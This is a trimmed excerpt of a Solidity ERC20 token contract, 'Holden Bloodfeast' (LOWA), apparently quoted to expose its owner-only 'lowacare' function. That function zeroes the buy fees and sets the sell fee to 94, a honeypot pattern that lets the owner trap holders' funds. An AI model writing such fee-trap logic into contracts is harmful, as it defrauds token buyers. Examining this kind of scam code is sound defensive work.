...
contract LOWA is ERC20, Ownable {
    ...
    constructor() ERC20("Holden Bloodfeast", "LOWA") {
        ...
        marketingWallet = address(0x2EdaA1a77b09f264c8C9474246271e696a898e01); //
    ...
    function lowacare() external onlyOwner returns (bool) {
        buyTotalFees = 0;
        buyMarketingFee = 0;
        buyLiquidityFee = 0;
        sellTotalFees = 94;
